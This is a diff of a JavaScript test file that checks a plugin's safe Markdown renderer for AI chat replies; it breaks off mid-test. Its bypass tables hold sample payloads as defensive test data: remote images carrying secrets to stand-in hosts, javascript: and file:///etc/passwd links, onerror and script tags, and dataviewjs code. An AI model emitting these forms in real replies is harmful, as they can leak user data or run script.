@@ -9,6 +9,9 @@ const dom = require('../support-dom.cjs');
 const { element, find, findAll, byLabel, tick } = dom;
 
 const eq = (actual, expected, message) => assert.deepEqual(plain(actual), plain(expected), message);
+// Text a reader would see in an element: its own text and its children's, in order.
+const visibleText = el => (el.text ?? '') + el.children.map(visibleText).join('');
+const replyBody = f => find(f.parts.log(), i => hasClass(i, 'is-assistant')).children.find(c => hasClass(c, 'vam-map-chat-text'));
 const MAP = 'Agent Workspace/Topics/map-a/Map.md';
 const { contentHash, buildMapChatContext } = load('core/map-chat-context.ts');
 
@@ -23,15 +26,12 @@ function page() {
   return { doc, root, attach };
 }
 function panelFixture(overrides = {}) {
-  const owners = [];
-  class Component { constructor() { this.loaded = false; this.unloaded = false; owners.push(this); } load() { this.loaded = true; } unload() { this.unloaded = true; } }
-  const { MapChatPanel } = load('experiences/visual-map/map-chat.ts', { obsidian: { ...obsidian, Component, Keymap: { isModEvent: event => !!event.ctrlKey } } });
+  const { MapChatPanel } = load('experiences/visual-map/map-chat.ts', { obsidian: { ...obsidian, Keymap: { isModEvent: event => !!event.ctrlKey } } });
   const p = page(); const overlay = p.attach(p.root.createDiv('vam-canvas-overlay'));
   const calls = { send: 0, stop: 0, layout: [], more: [], links: [] };
   const topics = { a: 'Topic A', b: 'Topic B' };
   let selected = [];
   let visibleNote = null;
-  const rendered = [];
   const prefs = { style: 'concise', model: '', saved: [], watchers: [] };
   const host = {
     style: () => prefs.style, setStyle: style => { prefs.style = style; prefs.saved.push(['style', style]); },
@@ -40,7 +40,6 @@ function panelFixture(overrides = {}) {
     model: () => prefs.model, setModel: model => { prefs.model = model; prefs.saved.push(['model', model]); }, moreDetail: origin => { calls.more.push(origin); },
     topicTitle: id => topics[id] ?? null, selectedIds: () => selected, send: () => { calls.send++; }, stop: () => { calls.stop++; },
     resolveLink: link => ({ Note: 'Notes/Note.md', Other: 'Notes/Other.md' })[link] ?? null, activeNotePath: () => 'Notes/Active.md', visibleNotePath: () => visibleNote,
-    renderMarkdown: async (text, el, owner) => { rendered.push({ text, el, owner }); el.setText(text); },
     openLink: (href, newLeaf) => { calls.links.push([href, newLeaf]); }, activeElement: () => p.doc.activeElement, layoutChanged: open => calls.layout.push(open), ...overrides
   };
   const panel = new MapChatPanel(host);
@@ -51,7 +50,7 @@ function panelFixture(overrides = {}) {
     send: () => byLabel(panel.el, 'Send'), stop: () => byLabel(panel.el, 'Stop'), close: () => byLabel(panel.bodyEl, 'Close AI chat'),
     chipTexts: () => findAll(panel.chipsEl, i => hasClass(i, 'vam-map-chat-chip-label')).map(i => i.text)
   };
-  return { panel, overlay, calls, prefs, page: p, parts, rendered, owners, showNote: path => { visibleNote = path; panel.refreshNote(); }, select: ids => { selected = ids; panel.refreshSelection(); } };
+  return { panel, overlay, calls, prefs, page: p, parts, setVisible: path => { visibleNote = path; }, showNote: path => { visibleNote = path; panel.refreshNote(); }, select: ids => { selected = ids; panel.refreshSelection(); } };
 }
 const hasClass = (item, name) => dom.hasCls(item, name);
 const key = (input, event) => { let prevented = false; input.fire('keydown', { preventDefault() { prevented = true; }, shiftKey: false, isComposing: false, ...event }); return prevented; };
@@ -195,7 +194,7 @@ test('map chat: while the AI works Stop is shown with a visible status, the repl
   assert.equal(f.parts.status().text, 'The AI is replying…'); assert.equal(f.parts.send().hidden, true); assert.equal(f.parts.stop().hidden, false);
   assert.equal(f.parts.stop().attrs['aria-label'], 'Stop'); assert.equal(f.parts.status().attrs.role, 'status'); assert.equal(f.parts.log().attrs.role, 'log');
   f.panel.streamReply('partial'); f.panel.streamReply('partial answer'); await tick();
-  assert.equal(find(f.parts.log(), i => hasClass(i, 'is-assistant')).children.find(c => hasClass(c, 'vam-map-chat-text')).text, 'partial answer');
+  assert.equal(visibleText(replyBody(f)), 'partial answer');
   eq(f.panel.turns(), [], 'a turn that is still streaming is not history');
   f.panel.finish('final answer', [{ status: 'done', text: 'Done: A' }, { status: 'skipped', text: 'Skipped: B' }]);
   assert.equal(f.parts.status().text, ''); assert.equal(f.parts.send().hidden, false); assert.equal(f.parts.stop().hidden, true);
@@ -1325,53 +1324,42 @@ test('map chat D1: dropped chips keep their remove behaviour with a note chip pr
   assert.equal(f.page.doc.activeElement, removes()[0]); assert.equal(f.panel.currentNote(), 'Notes/A.md');
 });
 
-test('map chat D1: assistant replies are laid out by the Markdown renderer; the question, errors and result lines stay plain text', async () => {
+test('map chat D4: replies are laid out by the safe renderer as they stream; the question, errors and result lines stay plain text', () => {
   const f = panelFixture(); f.panel.setOpen(true);
   f.panel.begin('**not bold**');
-  f.panel.streamReply('Hi **bo'); f.panel.streamReply('Hi **bold** and <script>x</script> <img src=x onerror=y>'); await tick();
-  assert.equal(f.rendered.at(-1).text, 'Hi **bold** and &lt;script>x&lt;/script> &lt;img src=x onerror=y>', 'the newest streamed text is the one laid out, with its raw HTML escaped (D3 F3)');
-  f.panel.finish('Done **bold** [[Note]]', [{ status: 'done', text: '**line**' }]); await tick(); await tick();
-  assert.equal(f.rendered.at(-1).text, 'Done **bold** [[Note]]', 'the last layout is the complete answer');
-  assert.ok(f.rendered.every(r => r.text !== '**not bold**' && r.text !== '**line**'), 'only the reply goes through the renderer');
-  assert.ok(f.rendered.every(r => hasClass(r.el, 'is-markdown') || r.el.cls?.includes('vam-map-chat-text')));
-  f.panel.begin('two'); f.panel.fail('Broke **hard**'); await tick();
-  assert.ok(!f.rendered.some(r => r.text === 'Broke **hard**'), 'an error text is not laid out');
+  f.panel.streamReply('Hi **bo'); f.panel.streamReply('Hi **bold** and <script>x</script> <img src=x onerror=y>');
+  const streaming = replyBody(f);
+  assert.equal(visibleText(streaming), 'Hi bold and <script>x</script> <img src=x onerror=y>', 'the newest streamed text is shown, HTML as text');
+  eq(findAll(streaming, i => i.tag === 'strong').map(visibleText), ['bold']); assert.equal(findAll(streaming, i => ['script', 'img'].includes(i.tag)).length, 0);
+  f.panel.finish('Done **bold** [[Note]]', [{ status: 'done', text: '**line**' }]);
+  const done = replyBody(f);
+  assert.equal(visibleText(done), 'Done bold Note', 'the last layout is the complete answer, with nothing left of earlier ones');
+  eq(findAll(done, i => i.tag === 'a').map(i => i.attrs['data-href']), ['Note']);
+  assert.equal(findAll(f.parts.log(), i => hasClass(i, 'vam-map-chat-line'))[0].text, '**line**');
+  f.panel.begin('two'); f.panel.fail('Broke **hard**');
+  const failed = findAll(f.parts.log(), i => hasClass(i, 'is-assistant')).at(-1).children.find(c => hasClass(c, 'vam-map-chat-text'));
+  assert.equal(failed.text, 'Broke **hard**'); assert.equal(failed.children.length, 0, 'an error text is not laid out');
   const user = findAll(f.parts.log(), i => hasClass(i, 'is-user'))[0];
   assert.equal(user.children.find(c => hasClass(c, 'vam-map-chat-text')).text, '**not bold**');
 });
 
-test('map chat D1: each layout has its own owner that is unloaded when replaced, when the log repaints and on dispose', async () => {
+test('map chat D4: layout is synchronous, so an older streamed text can never land after a newer one (replaces D3 F1)', () => {
   const f = panelFixture(); f.panel.setOpen(true);
-  f.panel.begin('q'); f.panel.streamReply('one'); f.panel.streamReply('two'); await tick();
-  const used = f.rendered.map(r => r.owner);
-  assert.ok(used.length >= 2 && used.every(o => o.loaded), 'owners are loaded before use');
-  assert.ok(used.slice(0, -1).every(o => o.unloaded), 'a replaced layout\'s owner is unloaded'); assert.equal(used.at(-1).unloaded, false);
-  f.panel.finish('three', []); await tick();
-  assert.equal(used.at(-1).unloaded, true, 'repainting the log unloads the old owners');
-  f.panel.dispose(); assert.ok(f.owners.every(o => o.unloaded), 'dispose unloads every owner');
+  f.panel.begin('q'); f.panel.streamReply('a'); f.panel.streamReply('b');
+  assert.equal(visibleText(replyBody(f)), 'b'); assert.equal(replyBody(f).children.length, 1, 'one paragraph, not one per streamed text');
+  f.panel.finish('final', []);
+  assert.equal(visibleText(replyBody(f)), 'final'); assert.equal(replyBody(f).children.length, 1);
 });
-
-test('map chat D1: a layout that throws falls back to plain text', async () => {
-  const f = panelFixture({ renderMarkdown: async () => { throw new Error('boom'); } }); f.panel.setOpen(true);
-  f.panel.begin('q'); f.panel.finish('**x**', []); await tick();
-  assert.equal(find(f.parts.log(), i => hasClass(i, 'is-assistant')).children.find(c => hasClass(c, 'vam-map-chat-text')).text, '**x**');
-});
-
-integrationTest('map chat D1: the view lays a reply out with MarkdownRenderer using the map file as its source path', async () => {
-  const h = await harness(); await h.view.hydrate(); h.open();
-  h.control.reply = async () => ({ reply: 'Hello **there**', actions: [], rejected: [] });
-  await send(h); await tick(); await tick();
-  const last = h.control.markdown.at(-1);
-  assert.equal(last.text, 'Hello **there**'); assert.equal(last.sourcePath, MAP); assert.ok(last.owner);
-});
-
 test('map chat D1: model output is never put into the page with innerHTML, and no private API is used', () => {
   const dir = path.join(root, 'experiences/visual-map');
   for (const file of fs.readdirSync(dir).filter(name => name.endsWith('.ts'))) {
     const text = fs.readFileSync(path.join(dir, file), 'utf8');
     assert.doesNotMatch(text, /dragManager|\.internal\b/, file);
-    if (file === 'map-chat.ts') assert.doesNotMatch(text, /innerHTML|outerHTML|insertAdjacentHTML/, file);
+    if (file === 'map-chat.ts') assert.doesNotMatch(text, /innerHTML|outerHTML|insertAdjacentHTML|MarkdownRenderer/, file);
   }
+  const coreDir = path.join(root, 'core');
+  for (const file of fs.readdirSync(coreDir).filter(name => /^map-chat-.*\.ts$/.test(name)))
+    assert.doesNotMatch(fs.readFileSync(path.join(coreDir, file), 'utf8'), /innerHTML|outerHTML|insertAdjacentHTML|MarkdownRenderer|dragManager|createEl\(\s*["'`](img|iframe|embed)/, file);
 });
 
 test('map chat D1: the view refreshes the note chip when the active leaf changes', () => {
@@ -1441,25 +1429,6 @@ integrationTest('map chat: closing the view mid-drag with a pending repaint neit
 
 // ---- Packet D3: review fixes F1-F5 ---------------------------------------------------------------------------------------------
 
-const { sanitizeChatMarkdown } = load('core/map-chat-markdown.ts');
-const replyBody = f => find(f.parts.log(), i => hasClass(i, 'is-assistant')).children.find(c => hasClass(c, 'vam-map-chat-text'));
-
-test('map chat D3 F1: a slow layout that finishes late never unloads the owner of the layout that is on screen', async () => {
-  const pend = [];
-  const f = panelFixture({ renderMarkdown: (text, el, owner) => new Promise(resolve => pend.push({ text, owner, el, done: () => { el.setText(text); resolve(); } })) });
-  f.panel.setOpen(true);
-  f.panel.begin('q'); f.panel.streamReply('a'); f.panel.streamReply('b'); // 'a' is in flight, 'b' waits
-  f.panel.finish('final', []);                                              // the log repaints: a new paint of 'final'
-  const finalOwner = pend.at(-1).owner;
-  pend[0].done(); await tick(); await tick();                               // the old paint resolves and would go on to 'b'
-  assert.equal(finalOwner.unloaded, false, 'the owner of the layout on screen is still loaded');
-  assert.ok(pend.every(item => item.text !== 'b'), 'the replaced paint stops instead of laying out its pending text into a detached element');
-  for (const item of pend) item.done(); await tick(); await tick();
-  assert.equal(finalOwner.unloaded, false);
-  assert.ok(pend.every(item => item.text !== 'b' || item.owner.unloaded), 'a layout the repaint replaced does not keep a live owner');
-  assert.equal(replyBody(f).text, 'final', 'the final reply is what is shown');
-});
-
 test('map chat D3 F2: a [[link]] in a reply opens the note; a modifier click opens it in a new tab; external links and other clicks are left alone', () => {
   const f = panelFixture(); f.panel.setOpen(true);
   const anchor = (cls, href) => { const a = element('a', { cls }); a.attrs['data-href'] = href; a.attrs.href = href; a.getAttribute = name => a.attrs[name] ?? null; a.closest = selector => selector === 'a' ? a : null; return a; };
@@ -1479,49 +1448,180 @@ integrationTest('map chat D3 F2: the view opens a clicked internal link from the
   eq(h.linkOpens, [['Notes/Note', MAP, false], ['Notes/Other', MAP, true]]);
 });
 
-test('map chat D3 F3: remote images become plain links, and embeds become plain links to the note', () => {
-  assert.equal(sanitizeChatMarkdown('see ![chart](https://evil.test/p.png?x=1) now'), 'see [chart](https://evil.test/p.png?x=1) now');
-  assert.equal(sanitizeChatMarkdown('![a](HTTP://evil.test/p.png "t")'), '[a](HTTP://evil.test/p.png "t")');
-  assert.equal(sanitizeChatMarkdown('![a](<https://evil.test/p.png>)'), '[a](https://evil.test/p.png)');
-  assert.equal(sanitizeChatMarkdown('![](//evil.test/p.png)'), '[](//evil.test/p.png)', 'a protocol-relative address is remote too');
-  assert.equal(sanitizeChatMarkdown('![a][ref]\n\n[ref]: https://evil.test/p.png'), '[a][ref]\n\n[ref]: https://evil.test/p.png', 'a reference-style image would load too');
-  assert.equal(sanitizeChatMarkdown('![ref]\n\n[ref]: https://evil.test/p.png'), '[ref]\n\n[ref]: https://evil.test/p.png');
-  assert.equal(sanitizeChatMarkdown('![[Secret note]] and ![[pic.png|200]] and ![[Note#Heading]]'), '[[Secret note]] and [[pic.png|200]] and [[Note#Heading]]');
-  assert.equal(sanitizeChatMarkdown('a plain [link](https://ok.test) and [[Note]]'), 'a plain [link](https://ok.test) and [[Note]]', 'links are not touched');
-  assert.equal(sanitizeChatMarkdown('![local](Attachments/p.png)'), '![local](Attachments/p.png)', 'a vault-relative image is not remote');
+
+// ---- Packet D4: the safe subset renderer (replaces MarkdownRenderer and the regex sanitiser) ------------------------------------
+
+const { renderChatMarkdown } = load('core/map-chat-render.ts');
+const lay = text => { const el = element('div'); renderChatMarkdown(el, text); return el; };
+const nodes = el => findAll(el, () => true);
+const FORBIDDEN_TAGS = ['img', 'iframe', 'embed', 'object', 'script', 'video', 'audio', 'svg', 'style', 'link', 'source', 'input'];
+const anchors = el => nodes(el).filter(i => i.tag === 'a');
+const externals = el => anchors(el).filter(i => hasClass(i, 'external-link')).map(i => i.attrs.href);
+const wikis = el => anchors(el).filter(i => hasClass(i, 'internal-link')).map(i => i.attrs['data-href']);
+const codeBlocks = el => nodes(el).filter(i => i.tag === 'pre').map(i => visibleText(i));
+/** Whatever the reply says, the tree holds no element that loads or runs anything and no code-block language. */
+function assertSafe(el, label) {
+  for (const item of nodes(el)) {
+    assert.ok(!FORBIDDEN_TAGS.includes(item.tag), `${label}: <${item.tag}> in the tree`);
+    assert.ok(!('src' in item.attrs) && !('srcset' in item.attrs) && !('onerror' in item.attrs), `${label}: ${JSON.stringify(item.attrs)}`);
+    assert.doesNotMatch(`${item.cls} ${JSON.stringify(item.attrs)}`, /language|lang-|dataview|mermaid/i, `${label}: a code language reached the tree`);
+    if (item.tag === 'a') {
+      if (hasClass(item, 'external-link')) { assert.match(item.attrs.href, /^https?:\/\//i, label); assert.equal(item.attrs.target, '_blank', label); assert.equal(item.attrs.rel, 'noopener', label); }
+      else assert.ok(hasClass(item, 'internal-link') && !/^[a-z][a-z0-9+.-]*:/i.test(item.attrs.href), `${label}: unexpected anchor ${JSON.stringify(item.attrs)}`);
+    }
+  }
+}
+
+// Every reviewer bypass sample (scratchpad probe.cjs) plus the rest of the unsupported syntax: nothing loads, nothing runs, and
+// the text the model wrote stays visible. `links` is the exact list of external addresses that may become clickable links.
+const BYPASSES = {
+  escapedBacktick: { text: '\\`![x](https://evil/a?q=secret)\\`', links: [], shows: '![x](https://evil/a?q=secret)' },
+  escapedBacktickHtml: { text: '\\`<img src=https://evil/x>\\`', links: ['https://evil/x'], shows: '<img src=https://evil/x>' },
+  headingThenLine: { text: '# Title `\n![x](https://evil/leak)`', links: [], shows: '![x](https://evil/leak)' },
+  listItems: { text: '- a `\n- ![x](https://evil/leak) `', links: [], shows: '![x](https://evil/leak)' },
+  nestedAlt: { text: '![a [b] c](https://evil/leak)', links: [], shows: '![a [b] c](https://evil/leak)' },
+  escapedAlt: { text: '![a\\]b](https://evil/leak)', links: [], shows: '![a\\]b](https://evil/leak)' },
+  entityScheme: { text: '![x](&#104;ttps://evil/leak)', links: [], shows: '![x](&#104;ttps://evil/leak)' },
+  entityColon: { text: '![x](https&colon;//evil/leak)', links: [], shows: '![x](https&colon;//evil/leak)' },
+  backslashScheme: { text: '![x](https\\://evil/leak)', links: [], shows: '![x](https\\://evil/leak)' },
+  escapedUrl: { text: '![x](https:\\/\\/evil/leak)', links: [], shows: '![x](https:\\/\\/evil/leak)' },
+  dataImg: { text: '![x](data:image/png;base64,AAAA)', links: [], shows: '![x](data:image/png;base64,AAAA)' },
+  fileImg: { text: '![x](file:///etc/passwd)', links: [], shows: '![x](file:///etc/passwd)' },
+  appImg: { text: '![x](app://local/Users/x/secret.png)', links: [], shows: '![x](app://local/Users/x/secret.png)' },
+  mdEmbed: { text: '![x](Secret.md)', links: [], shows: '![x](Secret.md)' },
+  remoteImg: { text: 'see ![chart](https://evil.test/p.png?x=1) now', links: [], shows: '![chart](https://evil.test/p.png?x=1)' },
+  protocolRelative: { text: '![](//evil.test/p.png)', links: [], shows: '![](//evil.test/p.png)' },
+  angleImg: { text: '![a](<https://evil.test/p.png>)', links: [], shows: '![a](<https://evil.test/p.png>)' },
+  linkImg: { text: '[![x](https://evil/i.png)](https://y)', links: ['https://y'], shows: '![x](https://evil/i.png)' },
+  indentedCode: { text: 'para\n\n    ![x](http://e/i) <b>', links: [], shows: '![x](http://e/i) <b>' },
+  crlfImg: { text: '![x](https://evil/a)\r\n', links: [], shows: '![x](https://evil/a)' },
+  refImage: { text: '![x][r]\n\n[r]: https://evil/a', links: ['https://evil/a'], shows: '![x][r]' },
+  autolinkAngle: { text: '<https://example.com>', links: ['https://example.com'], shows: '<' },
+  htmlTags: { text: '<iframe src="https://evil.test"></iframe> a <script>x</script>', links: ['https://evil.test'], shows: '<iframe src="https://evil.test"></iframe>' },
+  embedWiki: { text: '![[Secret]]', links: [], shows: '![[Secret]]' },
+  embedWikiAlias: { text: '![[pic.png|200]] ![[Note#Heading]]', links: [], shows: '![[pic.png|200]]' },
+  escapedBrackets: { text: '\\[\\[Secret\\]\\] \\[x\\](https://evil/a)', links: ['https://evil/a'], shows: '[[Secret]] [x](https://evil/a)' },
+  nestedLinkLabel: { text: '[a [b](https://evil/one)](https://evil/two)', links: ['https://evil/two'], shows: 'a [b](https://evil/one)' },
+  mathAndTable: { text: '$$ x < y $$\n\n| a | b |\n|---|---|\n| <img src=x> | 1 |', links: [], shows: '| <img src=x> | 1 |' },
+  dataviewInline: { text: '`= this.file.name` and `$= dv.x()`', links: [], shows: '$= dv.x()' }
+};
+for (const [name, c] of Object.entries(BYPASSES)) {
+  test(`map chat D4 bypass: ${name} shows the text and loads or runs nothing`, () => {
+    const el = lay(c.text);
+    assertSafe(el, name);
+    eq(externals(el), c.links); eq(wikis(el), []);
+    assert.ok(visibleText(el).includes(c.shows), `${name}: shows ${JSON.stringify(c.shows)} in ${JSON.stringify(visibleText(el))}`);
+  });
+}
+
+// Fences: whatever the language says, the content is plain text in a pre and the language goes nowhere.
+const FENCES = {
+  plain: { text: '```dataviewjs\ndv.paragraph(app.vault.getFiles())\n```', code: ['dv.paragraph(app.vault.getFiles())'] },
+  crlf: { text: '```dataviewjs\r\ndv.paragraph(1)\r\n```\r\n', code: ['dv.paragraph(1)'] },
+  cr: { text: '```dataviewjs\rdv.paragraph(1)\r```', code: ['dv.paragraph(1)'] },
+  tilde: { text: '~~~dataviewjs\n![x](https://e)\n~~~', code: ['![x](https://e)'] },
+  mermaid: { text: '~~~mermaid title\ngraph TD\n~~~', code: ['graph TD'] },
+  longer: { text: '````md\n```dataview\nTABLE\n```\n````', code: ['```dataview\nTABLE\n```'] },
+  indentedFence: { text: '  ````js {1}\nx\n````\nafter', code: ['x'] },
+  unclosed: { text: '```js\nno closing fence', code: ['no closing fence'] },
+  quote: { text: '> ```dataviewjs\n> app.vault\n> ```', code: ['app.vault'], inside: 'blockquote' },
+  quoteCrlf: { text: '> ```dataviewjs\r\n> app.vault\r\n> ```\r\n', code: ['app.vault'], inside: 'blockquote' },
+  callout: { text: '> [!note]\n> ```dataviewjs\n> dv.x\n> ```', code: ['dv.x'], inside: 'blockquote', shows: '[!note]' },
+  nestedQuote: { text: '> > ```dataviewjs\n> > dv.x\n> > ```', code: ['dv.x'], inside: 'blockquote' },
+  afterHeading: { text: '# Title\n```dataviewjs\ndv.x\n```', code: ['dv.x'] },
+  inParagraph: { text: 'before\n```dataviewjs\ndv.x\n```\nafter', code: ['dv.x'] }
+};
+for (const [name, c] of Object.entries(FENCES)) {
+  test(`map chat D4 fence: ${name} becomes a plain pre/code with no language`, () => {
+    const el = lay(c.text);
+    assertSafe(el, name);
+    eq(codeBlocks(el), c.code);
+    if (c.inside) assert.ok(findAll(nodes(el).find(i => i.tag === c.inside), i => i.tag === 'pre').length > 0, 'the fence stays inside its quote');
+    if (c.shows) assert.ok(visibleText(el).includes(c.shows));
+  });
+}
+test('map chat D4 fence: a fence inside a list item runs nothing, whatever it holds', () => {
+  for (const text of ['- ```dataviewjs\n  dv.x\n  ```', '- a\n  - b\n\n    ```dataviewjs\n    dv.x\n    ```', '1. ```dataviewjs\n   dv.x\n   ```']) {
+    const el = lay(text); assertSafe(el, text); assert.ok(visibleText(el).includes('dv.x'));
+  }
+});
+test('map chat D4: a code block keeps markup as text: nothing inside a fence or an inline code span is interpreted', () => {
+  const fence = lay('```\n![x](https://evil.test/p.png)\n![[Note]]\n<b>x</b>\n**y**\n```');
+  eq(codeBlocks(fence), ['![x](https://evil.test/p.png)\n![[Note]]\n<b>x</b>\n**y**']); eq(anchors(fence), []);
+  const span = lay('use `<div>` and `![x](https://evil.test/p.png)` and ``![[Note]]`` and `**x**`');
+  eq(nodes(span).filter(i => i.tag === 'code').map(i => i.text), ['<div>', '![x](https://evil.test/p.png)', '![[Note]]', '**x**']); eq(anchors(span), []);
+  const stray = lay('stray ` then <b>\n\nnext `<c>`');
+  assert.ok(visibleText(stray).includes('stray ` then <b>'));
+  eq(nodes(stray).filter(i => i.tag === 'code').map(i => i.text), ['<c>'], 'an unmatched backtick shields nothing past its paragraph');
 });
 
-test('map chat D3 F3: raw HTML is escaped so iframe, img and script are text', () => {
-  assert.equal(sanitizeChatMarkdown('<iframe src="https://evil.test"></iframe>'), '&lt;iframe src="https://evil.test">&lt;/iframe>');
-  assert.equal(sanitizeChatMarkdown('a <img src=x onerror=y> b <script>x</script>'), 'a &lt;img src=x onerror=y> b &lt;script>x&lt;/script>');
-  assert.equal(sanitizeChatMarkdown('1 < 2 and **bold**'), '1 &lt; 2 and **bold**');
+test('map chat D4 syntax: bold, italic, strike-through, inline code and nesting', () => {
+  const el = lay('a **bold** _it_ *em* __b2__ ~~gone~~ `code` **bold _both_**');
+  eq(nodes(el).filter(i => i.tag === 'strong').map(visibleText), ['bold', 'b2', 'bold both']);
+  eq(nodes(el).filter(i => i.tag === 'em').map(visibleText), ['it', 'em', 'both']);
+  eq(nodes(el).filter(i => i.tag === 'del').map(visibleText), ['gone']); eq(nodes(el).filter(i => i.tag === 'code').map(i => i.text), ['code']);
+  assert.ok(visibleText(lay('snake_case_name and a * b')).includes('snake_case_name and a * b'), 'underscores inside words and spaced stars are text');
 });
 
-test('map chat D3 F3: a code fence loses its language (so no external processor runs it) but keeps its content', () => {
-  assert.equal(sanitizeChatMarkdown('```dataviewjs\ndv.paragraph(app.vault.getFiles())\n```'), '```\ndv.paragraph(app.vault.getFiles())\n```');
-  assert.equal(sanitizeChatMarkdown('~~~mermaid title\ngraph TD\n~~~'), '~~~\ngraph TD\n~~~');
-  assert.equal(sanitizeChatMarkdown('  ````js {1}\nx\n````\nafter'), '  ````\nx\n````\nafter');
-  assert.equal(sanitizeChatMarkdown('```\nplain\n```'), '```\nplain\n```', 'a fence without a language is unchanged');
-  assert.equal(sanitizeChatMarkdown('```js\nno closing fence'), '```\nno closing fence', 'an unclosed fence runs to the end, as Markdown reads it');
-  assert.equal(sanitizeChatMarkdown('````md\n```dataview\nTABLE\n```\n````'), '````\n```dataview\nTABLE\n```\n````', 'a shorter fence inside a longer one is content');
+test('map chat D4 syntax: headings are all one small size, with a class and a real heading element', () => {
+  const el = lay('# One\n## Two ##\n###### Six\n####### seven hashes\n#nospace');
+  eq(nodes(el).filter(i => /^h[1-6]$/.test(i.tag)).map(i => [i.tag, visibleText(i)]), [['h1', 'One'], ['h2', 'Two'], ['h6', 'Six']]);
+  assert.ok(nodes(el).filter(i => /^h[1-6]$/.test(i.tag)).every(i => hasClass(i, 'vam-map-chat-heading')));
+  assert.ok(visibleText(el).includes('####### seven hashes') && visibleText(el).includes('#nospace'), 'not headings: stay as written');
 });
 
-test('map chat D3 F3: nothing inside a code fence or inline code is rewritten', () => {
-  const fence = '```\n![x](https://evil.test/p.png)\n![[Note]]\n<b>x</b>\n```';
-  assert.equal(sanitizeChatMarkdown(fence), fence);
-  assert.equal(sanitizeChatMarkdown('~~~\n<div>\n~~~'), '~~~\n<div>\n~~~');
-  assert.equal(sanitizeChatMarkdown('use `<div>` and `![x](https://evil.test/p.png)` and ``![[Note]]``'), 'use `<div>` and `![x](https://evil.test/p.png)` and ``![[Note]]``');
-  assert.equal(sanitizeChatMarkdown('`<a>` then <b> and ![x](https://e.test/p.png)'), '`<a>` then &lt;b> and [x](https://e.test/p.png)', 'text outside the span is still cleaned');
-  assert.equal(sanitizeChatMarkdown('stray ` then <b>\n\nnext `<c>`'), 'stray ` then &lt;b>\n\nnext `<c>`', 'an unmatched backtick does not shield the rest of its paragraph or the next one');
-  assert.equal(sanitizeChatMarkdown('before\n```js\n<x>\n```\n<y>'), 'before\n```\n<x>\n```\n&lt;y>', 'text after a fence is cleaned again');
+test('map chat D4 syntax: unordered and ordered lists, nested at most two levels, and a quote and a rule', () => {
+  const el = lay('- a\n- b\n  - b1\n    - b2\n- c\n\n1. one\n2) two\n\n> quoted **bold**\n> more\n\n---\n***\ntext');
+  const lists = nodes(el).filter(i => i.tag === 'ul' || i.tag === 'ol');
+  eq(lists.map(i => i.tag), ['ul', 'ul', 'ol']);
+  const own = li => li.children.filter(c => c.tag !== 'ul' && c.tag !== 'ol').map(visibleText).join('');
+  eq(findAll(lists[0], i => i.tag === 'li').map(own), ['a', 'b', 'b1', 'b2', 'c'], 'depth is capped, so b2 joins b1\'s list');
+  assert.equal(findAll(lists[0], i => i.tag === 'ul').length, 2, 'two levels of ul at most');
+  eq(findAll(lists[2], i => i.tag === 'li').map(visibleText), ['one', 'two']);
+  const quote = nodes(el).find(i => i.tag === 'blockquote'); assert.equal(visibleText(quote), 'quoted boldmore'); assert.equal(findAll(quote, i => i.tag === 'strong').length, 1);
+  assert.equal(nodes(el).filter(i => i.tag === 'hr').length, 2);
 });
 
-test('map chat D3 F3: the panel hands the renderer only sanitised text, while the stored reply stays as the model wrote it', async () => {
-  const f = panelFixture(); f.panel.setOpen(true);
-  f.panel.begin('q');
-  f.panel.finish('![x](https://evil.test/p.png) <img src=x> ![[Secret]]\n```dataviewjs\nrun()\n```', []); await tick(); await tick();
-  assert.equal(f.rendered.at(-1).text, '[x](https://evil.test/p.png) &lt;img src=x> [[Secret]]\n```\nrun()\n```');
-  assert.equal(f.panel.transcript().at(-1).text, '![x](https://evil.test/p.png) <img src=x> ![[Secret]]\n```dataviewjs\nrun()\n```', 'history for the next request is untouched');
+test('map chat D4 syntax: [[wiki links]] with and without an alias become internal links the click handler opens', () => {
+  const el = lay('see [[Note]] and [[Folder/Other#Part|the part]] but not [[]] or [[a\nb]]');
+  eq(anchors(el).map(i => [i.cls, i.attrs['data-href'], visibleText(i)]), [['internal-link', 'Note', 'Note'], ['internal-link', 'Folder/Other#Part', 'the part']]);
+  assertSafe(el, 'wiki');
+});
+
+test('map chat D4 syntax: [text](url) accepts http and https only; every other scheme stays plain text', () => {
+  const ok = lay('[site](https://example.com/a?b=1) and [plain](HTTP://example.com) and [t](https://example.com/x "title") and [paren](https://example.com/a_(b))');
+  eq(externals(ok), ['https://example.com/a?b=1', 'HTTP://example.com', 'https://example.com/x', 'https://example.com/a_(b)']);
+  eq(anchors(ok).map(i => [i.attrs.target, i.attrs.rel]).filter(x => x[0] !== '_blank' || x[1] !== 'noopener'), []);
+  for (const url of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,x', 'file:///etc/passwd', 'app://local/x', 'obsidian://open?vault=v', 'vbscript:x', 'mailto:a@b.c', '//evil.test/x', 'ftp://example.com/x', '/relative', '#anchor', ' javascript:alert(1)']) {
+    const el = lay(`[click](${url})`);
+    eq(anchors(el), [], url); assert.ok(visibleText(el).includes(`[click](${url.trim()})`) || visibleText(el).includes(`[click](${url})`), `${url} stays visible as written`);
+  }
+  assertSafe(ok, 'links');
+});
+
+test('map chat D4 syntax: a bare http(s) address becomes a link, without the punctuation that follows it', () => {
+  const el = lay('go to https://example.com/a. Also (http://example.com/b), https://example.com/c?x=1&y=2; and ftp://nope.test plus xhttps://no.test');
+  eq(externals(el), ['https://example.com/a', 'http://example.com/b', 'https://example.com/c?x=1&y=2']);
+  assert.ok(visibleText(el).includes('ftp://nope.test plus xhttps://no.test'));
+});
+
+test('map chat D4 Bug B: a link with no words shows its address, so it is never invisible', () => {
+  for (const text of ['[](https://example.com/p)', '[ ](https://example.com/p)', '[  \n ](https://example.com/p)']) {
+    const el = lay(text); const [a] = anchors(el);
+    assert.equal(visibleText(a), 'https://example.com/p', JSON.stringify(text)); assert.equal(a.attrs.href, 'https://example.com/p');
+  }
+  assert.equal(nodes(lay('![](https://example.com/p.png)')).filter(i => i.tag === 'img').length, 0, 'an image is never created, whatever its alt text');
+});
+
+test('map chat D4: line breaks are normalised (CRLF and CR) and kept inside a paragraph; blank lines separate paragraphs', () => {
+  const el = lay('one\r\ntwo\rthree\r\n\r\nnext');
+  assert.ok(!nodes(el).some(i => String(i.text).includes('\r')), 'no carriage return survives');
+  eq(el.children.map(i => i.tag), ['p', 'p']); eq(el.children[0].children.map(i => i.tag === 'br' ? '|' : i.text), ['one', '|', 'two', '|', 'three']);
+});
+
+test('map chat D4: a very deep or very long reply is laid out without throwing', () => {
